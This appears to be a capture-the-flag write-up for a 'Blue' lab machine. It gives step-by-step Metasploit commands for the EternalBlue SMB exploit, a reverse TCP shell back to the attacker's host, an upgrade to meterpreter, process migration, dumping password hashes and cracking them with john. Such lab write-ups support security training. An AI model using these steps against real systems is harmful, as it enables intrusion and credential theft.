@@ -1,0 +1,89 @@
+# blue
+
+enumeration:
+	
+	nmap: 
+
+		command: sudo nmap -sS -sV --script vuln -oN initial_scan.txt 10.10.81.62
+
+		findings: 
+
+			[1] This machine has several important open ports (139, 445, 3389) and vulnerable to Remote Code Execution vulnerability. 
+
+Execution: 
+
+	[1] As these machine is vulnerable for 'Remote Code Exectution' and several exploits are publically available out of one is 'Eternal Blue'. 
+
+	[2] The exploit took port 139 and 445 in use which commonly used for SMB service. 
+
+	[3] As this machine is vulnerable to famous exploit hence we will start our 'Metasploit' to exploit this vulnerability.
+	Command: sudo msfconsole
+
+	[4] Search for the exploit name 'ms17_010_eternalblue'.
+	Command: search ms17_010_eternalblue
+
+	[5] Now, use following command to use exploit.
+	Command: use exploit/windows/smb/ms17_010_eternalblue
+
+	[6] Now we need to analyze which parameters we need to provide to the exploit.
+	Command: show options
+
+	[7] As these is the IP based vulnerability, we just need to enter IP address and the port number on which service is running on. 
+	Commands:
+
+		set RHOSTS <IP_of_vulnerable_machine>
+		set RPORT <smb_port_vulnerable_machine>
+
+	[8] We also need to set the listner port and IP address of our machine to get access.
+
+		set LHOST <IP_of_your_machine>
+		set LPORT <any_port_no>
+
+	[9] As these machine focuses on the complete access from getting an initial access to escalating our privileges with eternal blue we will first take a initial access of vulnerable machine.
+	Command: set payload windows/x64/shell/reverse_tcp
+
+	[10] Now, all set to get an initial access of the machine. Lets run the exploit.
+	Command: run
+
+	[11] As we have got an initial access we will hide the session and will try to escalate our privilege.
+
+	[12] We will use post module from metasploit to convert our shell session into powerfull meterpreter session.
+	Command: use post/multi/manage/shell_to_meterpreter
+
+	[13] Here we need to set 2 attributes LHOST and SESSION id.
+	Commands: 
+
+		set LHOST <your_IP>
+		set SESSION <session_id>
+
+	[14] Run the exploit.
+	Command: run
+
+	[15] As we have been notified we got an another session which is meterpreter session and we successfully made to the meterpreter session. We can check active sessions by following command.
+	Command: sessions -i
+
+	[16] To use meterpreter session we will use following command.
+	Command: sessions -i 2
+
+	[17] This lab also focusses on providing a knowledge about migrating our service with a legitimate privileged processes. To list out the processes that are running on the vuln. machine we will use following command.
+	Command: ps
+
+	[18] We have observed that there is a privileged process running on PID 712. To migrate on the service we need to run following command.
+	Command: migrate <PID>
+
+	[19] As we have full access of the machine and we successfully we will use following command to retrive credentials details of the users.
+	Command: hashdump
+
+	[20] As we got passwords in hashed format we will copy and paste into a file on our local machine.
+
+	[21] We will try to retrive password into plain text with john tool.
+	Command: john --format=NT --wordlis=/path/to/wordlist.txt hash_file
+
+	[22] As we have successfully retrived password into plain text, the last task is to submit the flags hidden in the machine.
+
+	[23] As with help of the information provided in the room we have successfully solved the room!
+
+
+
+
+
